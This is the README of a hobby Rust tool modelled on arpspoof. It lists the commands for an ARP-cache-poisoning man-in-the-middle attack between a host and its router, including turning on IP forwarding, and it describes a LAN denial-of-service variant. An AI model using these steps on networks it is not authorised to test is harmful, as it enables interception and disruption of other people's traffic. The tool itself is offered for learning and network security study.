ARPoison
========

This is a simple program written with the intention of learning the Rust language. It is based on the `arpspoof` utility from dsniff.

Disclaimer: This code is provided for educational purposes only. Don't poison networks you don't have permission to!

## Build
`cargo build`

## Usage

### MITM Using ARP Cache Poisoning
Normal Operation:
```
[ Alice ]<---+  +--->[ Mal ]
             |  |
             v  v
          [ router ]
```

After poisoning the router with Alice's IP and our MAC, we poison Alice with the router's IP and our MAC.

Poison Alice:
```
# arpoison -i eth0 -t <Alice's IP> -m <Alice's MAC> <Router's IP>
```

Poison Router:
```
# arpoison -i eth0 -t <Router's IP> -m <Routers's MAC> <Alice's IP>
```

Turn on kernel IP forwarding. We basically become a router:
```
# sysctl -w net.ipv4.ip_forward=1
```

MITM Operation:
```
[ Alice ]<--->[ Mal ]
                ^
                |   
                v    
            [ router ]

```
Now you can use `iptables`, or `tcpdump`, or anything really to capture/manipulate/inspect IPv4 traffice between Alice and the Router.

### LDoS - LAN Denial of Service
Like the scenario above, it is possible to direct host traffic to yourself, by spoffing the gateway, but without IPv4 packet forwarding enabled. Hosts will be cut off from internet connectivity!

### Help Text
```
ARPoison 0.1.0
solidus
A stupid attempt to learn Rust

USAGE:
    arpoison [FLAGS] <HOST> --interface <interface> --target-mac <macaddr> --target <target>

FLAGS:
    -b, --bidirectional    If present, poison target and host in both directions
    -h, --help             Prints help information
    -V, --version          Prints version information

OPTIONS:
    -i, --interface <interface>    Interface to use to send spoofed data
    -m, --target-mac <macaddr>     The MAC address of the target
    -t, --target <target>          Target IP to poison

ARGS:
    <HOST>    The host to inpersonate (usually the gateway)
```
